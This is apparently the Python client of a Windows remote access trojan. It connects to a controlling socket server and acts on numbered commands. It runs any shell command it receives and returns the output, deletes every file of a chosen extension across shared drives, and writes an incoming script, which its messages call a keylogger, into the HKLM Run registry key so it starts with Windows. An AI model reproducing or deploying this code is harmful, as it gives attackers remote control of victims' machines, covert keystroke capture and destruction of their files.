import SocketClass
import subprocess as sub
import winreg as reg
import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

def run_cmd(command):
    try:
        res = sub.check_output(command,shell=True).decode()
    except sub.CalledProcessError:
        res = "Your input is wrong"
    return res

def find_drive():
    drive = ["A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:"]
    client_drive = []
    res = run_cmd("net share")
    for d in drive:
        if d in res:
            client_drive.append(d)
    return client_drive

def search_files(ext):
    client_drive = find_drive()
    for d in client_drive:
        res = run_cmd(f"cd {d} && dir /b/s *.{ext}")
        if res == "Your input is wrong":
            continue
        else:
            path_file = res.split("\r\n")
    return path_file[:-1]

def delete_files(ext):
    path = search_files(ext)
    for p in path:
        run_cmd(f"del {p}")
    return "All files are deleted"
 
def add_To_Startup(name,pathh):
    try:
        keyval="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        if not os.path.exists("keyval"):
            reg.CreateKey(reg.HKEY_LOCAL_MACHINE,keyval)
        Registrykey = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, keyval, 0,reg.KEY_WRITE)
        reg.SetValueEx(Registrykey,name,1,reg.REG_SZ,pathh)
        reg.CloseKey(Registrykey)
        return True
    except WindowsError:
        return False

def slm():
    dirname, filename = os.path.split(os.path.abspath(__file__))
    options = webdriver.ChromeOptions()
    prefs = {"download.default_directory" : "C:\\Users"}
    options.add_experimental_option("prefs",prefs)
    browser = webdriver.Chrome(executable_path= dirname + "\\chromedriver.exe" ,chrome_options=options)
    browser.maximize_window()
    browser.get("https://www.python.org")
    element = browser.find_element_by_xpath("/html/body/div/header/div/nav/ul/li[2]/a")
    element.click()
    time.sleep(5)
    element1 = browser.find_element_by_xpath("/html/body/div/header/div/div[2]/div/div[3]/p/a")
    element1.click()
    time.sleep(100)
    browser.close()

def main_code():
    while True:
        choice = Ss.receive_data()
        if choice == "6":
            Ss.s.close()
            break
        
        elif choice == "1":
            while True:
                rec = Ss.receive_data()
                if rec == "q":
                    break
                res = run_cmd(rec)
                Ss.send_data(res)

        elif choice == "2":
            while True:
                rec = Ss.receive_data()
                if rec == "4":
                    break
                res = run_cmd(rec)
                Ss.send_data(res)

        elif choice == "3":
            rec = Ss.receive_data()
            res = delete_files(rec)
            Ss.send_data(res)

        elif choice == "4":
            dirname, filename = os.path.split(os.path.abspath(__file__))
            f = open(f"{dirname}\\init.py","w")
            rec = Ss.receive_data()
            f.write(rec)
            f.close()
            Ss.send_data("keylogger is copied.")
            res = add_To_Startup("init", f"{dirname}\\init.py")
            if res:
                Ss.send_data("keylogger added to register.")
            else:
                Ss.send_data("keylogger did not add to register. Maybe you do not have administrator access.")

        elif choice == "5":
            slm()
            Ss.send_data("Selenium task is done")
            

Ss = SocketClass.Ssocket("c")           
Ss.client_connect()
main_code()